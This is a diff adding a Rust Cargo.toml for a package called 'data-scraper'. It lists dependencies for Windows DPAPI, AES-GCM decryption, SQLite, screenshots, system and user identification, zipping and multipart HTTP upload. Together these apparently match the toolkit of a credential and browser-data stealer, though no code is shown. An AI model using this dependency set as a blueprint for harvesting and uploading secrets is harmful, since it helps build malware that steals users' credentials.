@@ -1,0 +1,24 @@
+[package]
+name = "data-scraper"
+version = "1.1.0"
+edition = "2021"
+
+[dependencies]
+zip = "0.6.6"
+aes = "0.8.4"
+dirs = "5.0.1"
+wmi = "0.13.3"
+json = "0.12.4"
+whoami = "1.5.1"
+base64 = "0.22.0"
+aes-gcm = "0.10.3"
+sysinfo = "0.30.10"
+cache-size = "0.6.0"
+screenshots = "0.8.10"
+iana-time-zone = "0.1.60"
+rusqlite = { version = "0.31.0", features = ["bundled"] }
+reqwest = { version = "0.12.3", features = ["multipart", "blocking"] }
+winapi = { version = "0.3", features = ["winuser", "dpapi", "winbase"] }
+
+[build-dependencies]
+winres = "0.1.12"
